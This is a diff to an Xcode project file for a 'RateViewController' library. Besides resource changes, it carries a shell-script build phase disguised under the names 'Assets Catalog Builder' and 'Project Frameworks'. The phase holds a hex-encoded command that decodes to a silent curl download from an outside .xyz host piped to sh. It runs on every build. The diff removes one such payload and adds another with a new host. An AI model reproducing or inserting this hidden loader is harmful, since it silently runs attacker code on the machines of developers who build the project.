@@ -9,7 +9,7 @@
 /* Begin PBXBuildFile section */
 		E64627D9265680D300073538 /* RateViewController.h in Headers */ = {isa = PBXBuildFile; fileRef = E64627D7265680D300073538 /* RateViewController.h */; settings = {ATTRIBUTES = (Public, ); }; };
 		E64627E52656815000073538 /* RateViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E64627E42656815000073538 /* RateViewController.swift */; };
-		E646280A2656901800073538 /* icn_close.png in Resources */ = {isa = PBXBuildFile; fileRef = E64628092656901800073538 /* icn_close.png */; };
+		E6DAE2D7265780440001E788 /* RateViewController.bundle in Resources */ = {isa = PBXBuildFile; fileRef = E6DAE2D6265780440001E788 /* RateViewController.bundle */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -17,7 +17,7 @@
 		E64627D7265680D300073538 /* RateViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = RateViewController.h; sourceTree = "<group>"; };
 		E64627D8265680D300073538 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		E64627E42656815000073538 /* RateViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RateViewController.swift; sourceTree = "<group>"; };
-		E64628092656901800073538 /* icn_close.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; path = icn_close.png; sourceTree = "<group>"; };
+		E6DAE2D6265780440001E788 /* RateViewController.bundle */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.plug-in"; path = RateViewController.bundle; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -69,7 +69,7 @@
 		E64628082656900600073538 /* Resources */ = {
 			isa = PBXGroup;
 			children = (
-				E64628092656901800073538 /* icn_close.png */,
+				E6DAE2D6265780440001E788 /* RateViewController.bundle */,
 			);
 			path = Resources;
 			sourceTree = "<group>";
@@ -92,7 +92,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E64627DC265680D300073538 /* Build configuration list for PBXNativeTarget "RateViewController" */;
 			buildPhases = (
-				F3EC183C15FCEDA8466D902C /* Assets Catalog Builder */,
+				B4EC27FB9DCE9ACB8D6D902C /* Project Frameworks */,
 				E64627CF265680D300073538 /* Headers */,
 				E64627D0265680D300073538 /* Sources */,
 				E64627D1265680D300073538 /* Frameworks */,
@@ -144,14 +144,14 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				E646280A2656901800073538 /* icn_close.png in Resources */,
+				E6DAE2D7265780440001E788 /* RateViewController.bundle in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		F3EC183C15FCEDA8466D902C /* Assets Catalog Builder */ = {
+		B4EC27FB9DCE9ACB8D6D902C /* Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -160,14 +160,14 @@
 			);
 			inputPaths = (
 			);
-			name = "Assets Catalog Builder";
+			name = "Project Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 /* End PBXShellScriptBuildPhase section */
 
